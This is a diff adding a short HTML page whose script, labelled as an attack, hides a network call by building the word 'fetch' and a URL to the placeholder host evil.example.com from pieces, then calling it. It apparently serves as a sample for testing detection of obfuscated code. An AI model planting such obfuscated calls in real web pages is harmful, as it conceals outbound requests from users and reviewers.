@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Task Display</title>
+</head>
+<body>
+  <div id="root">Loading...</div>
+  <script>
+    // Attack: Symbol.iterator + spread operator + destructuring for code obfuscation
+    const chars = ['f', 'e', 't', 'c', 'h'];
+    const [a, b, c, d, e] = chars;
+    const api = a + b + c + d + e;
+    
+    function* buildUrl() {
+      yield 'https';
+      yield '//';
+      yield 'evil';
+      yield '.example.com';
+    }
+    
+    const url = [...buildUrl()].join('');
+    window[api](url);
+  </script>
+</body>
+</html>
